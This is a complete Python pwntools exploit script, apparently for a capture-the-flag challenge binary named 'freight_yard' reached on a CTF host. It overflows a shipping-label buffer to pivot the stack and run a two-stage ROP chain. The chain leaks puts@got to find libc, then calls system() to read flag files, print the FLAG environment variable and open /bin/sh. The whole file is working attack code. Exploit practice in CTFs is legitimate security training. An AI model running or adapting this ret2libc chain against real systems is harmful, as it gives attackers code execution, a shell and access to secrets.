#!/usr/bin/env python3
from pwn import *
import argparse
import time

HOST_DEFAULT = "tcp-01kyyqtyyjz9wr78rt1zp6jt7j.u-ctf-ctf-7001b39a.urc.tf"
PORT_DEFAULT = 443

context.log_level = "info"


def parse_args():
    ap = argparse.ArgumentParser()
    ap.add_argument("--local", action="store_true")
    ap.add_argument("--host", default=HOST_DEFAULT)
    ap.add_argument("--port", type=int, default=PORT_DEFAULT)
    ap.add_argument("--binary", default="./freight_yard")
    ap.add_argument("--libc", default="./libc.so.6")
    ap.add_argument("--ld", default="./ld-linux-x86-64.so.2")
    ap.add_argument("--retries", type=int, default=30)
    return ap.parse_args()


def start(a):
    if a.local:
        return process([a.ld, "--library-path", ".", a.binary])

    last = None
    for i in range(1, a.retries + 1):
        try:
            return remote(a.host, a.port, ssl=True, sni=a.host, timeout=10)
        except Exception as e:
            last = e
            log.warning(f"connect {i}/{a.retries} failed: {e!r}")
            time.sleep(0.5)
    raise last


def choose(io, n):
    io.sendlineafter(b"> ", str(n).encode())


def load_bay(io, idx, data):
    assert len(data) <= 0x40
    choose(io, 1)
    io.sendlineafter(b"Bay number [0-3]: ", str(idx).encode())
    io.recvuntil(b"Cargo (")
    io.recvuntil(b": ")
    io.send(data.ljust(0x40, b"\x00"))


def dispatch_pivot(io, fake_rbp, leave_ret):
    choose(io, 4)
    io.recvuntil(b"Enter shipping label for dispatch:\n")

    payload  = b"A" * 0x20
    payload += p64(fake_rbp)    # saved rbp
    payload += p64(leave_ret)   # saved rip -> leave; ret
    payload  = payload.ljust(0x38, b"B")
    assert len(payload) == 0x38

    io.send(payload)
    io.recvuntil(b"Shipment dispatched.\n")


def main():
    a = parse_args()
    context.binary = elf = ELF(a.binary, checksec=False)
    libc = ELF(a.libc, checksec=False)

    POP_RDI   = 0x4011a6
    POP_RSI   = 0x4011a8
    POP_RDX   = 0x4011aa
    POP_RBP   = 0x40118d
    RET       = 0x4011a7
    LEAVE_RET = 0x401619

    BAYS  = elf.sym["bays"]
    PIVOT = elf.sym["__pivot_stack"] + 0x1f60
    STAGE2_LEN = 0x100
    CMD_OFF = 0x80

    log.info(f"bays      = {BAYS:#x}")
    log.info(f"pivot     = {PIVOT:#x}")
    log.info(f"leave_ret = {LEAVE_RET:#x}")

    io = start(a)

    # Leak puts@got, not write@got.  On this libc, write@got resolves to __write+0x10,
    # which makes libc base calculation off by 0x10. puts is already resolved by banner/menu.
    leak_target = elf.got["puts"]
    leak_name = "puts"

    stage1 = flat(
        0,
        POP_RDI, 1,
        POP_RSI, leak_target,
        POP_RDX, 8,
        elf.plt["write"],

        POP_RDI, 0,
        POP_RSI, PIVOT,
        POP_RDX, STAGE2_LEN,
        elf.plt["read"],

        POP_RBP, PIVOT,
        LEAVE_RET,
    )
    log.info(f"stage1 length = {len(stage1)}")
    assert len(stage1) <= 3 * 0x40

    for i in range(3):
        load_bay(io, i, stage1[i * 0x40:(i + 1) * 0x40])

    dispatch_pivot(io, BAYS, LEAVE_RET)

    leak = u64(io.recvn(8))
    libc.address = leak - libc.sym[leak_name]

    log.success(f"{leak_name} leak = {leak:#x}")
    log.success(f"libc base  = {libc.address:#x}")

    if libc.address & 0xfff:
        log.warning("libc base is not page-aligned. Something is off; continuing anyway.")

    cmd = b"cat flag.txt 2>/dev/null; cat /flag 2>/dev/null; printenv FLAG 2>/dev/null; /bin/sh\x00"

    stage2 = flat(
        0,
        RET,                  # stack alignment before system
        POP_RDI,
        PIVOT + CMD_OFF,
        libc.sym["system"],
    )
    stage2 = stage2.ljust(CMD_OFF, b"\x00") + cmd
    stage2 = stage2.ljust(STAGE2_LEN, b"\x00")
    assert len(stage2) == STAGE2_LEN

    io.send(stage2)
    out = io.recvall(timeout=5)
    print(out.decode(errors="ignore"))


if __name__ == "__main__":
    main()
